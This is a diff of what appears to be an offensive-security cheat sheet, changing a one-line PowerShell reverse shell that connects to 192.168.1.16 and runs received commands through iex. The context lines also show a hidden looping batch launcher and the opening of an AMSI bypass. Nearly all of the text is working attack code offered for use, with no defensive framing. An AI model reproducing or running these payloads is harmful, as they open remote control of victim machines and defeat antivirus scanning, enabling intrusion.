@@ -128,7 +128,8 @@ echo goto loop  >> nihbtdtdow.bat
 powershell -c "Start-Process -FilePath "%temp%\nihbtdtdow.bat" -WindowStyle Hidden"
 ---------------------------------------------------------------------------------------------------------------
 Obfuscated Powershell 
-$C=new-object net.sockets.tcpclient('192.168.1.16',4444);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){;$D=(new-object -typename System.Text.ASCIIEncoding).GetString($B,0,$I);$O=(iex $D 2>&1 | Out-String);$OB=$O+'PS '+(pwd).Path+'> ';$SB=([text.encoding]::ASCII).GetBytes($OB);$S.Write($SB,0,$SB.Length);$S.Flush()};$C.Close()
+$C=new-object net.sockets.tcpclient('192.168.1.16',3333);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){;$D=(new-object -typename System.Text.ASCIIEncoding).GetString($B,0,$I);$O=(iex $D 2>&1 | Out-String);$OB=$O+'PS '+(pwd).Path+'> ';$SB=([text.encoding]::ASCII).GetBytes($OB);$S.Write($SB,0,$SB.Length);$S.Flush()};$C.Close()
+$h='192.168.1.16';$p=3333;$C=New-Object Net.Sockets.TcpClient($h,$p);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){;$D=([Text.Encoding]::ASCII).GetString($B,0,$I);$O=(iex $D 2>&1|Out-String);$OB=$O+'PS '+(Get-Location).Path+'> ';$SB=[Text.Encoding]::ASCII.GetBytes($OB);$S.Write($SB,0,$SB.Length);$S.Flush()};$C.Close() 
 ---------------------------------------------------------------------------------------------------------------
 Bypassing AMSI to run powershell Scripts :
 $a = [Ref].Assembly.GetTypes() | ?{$_.Name -like '*siUtils'}
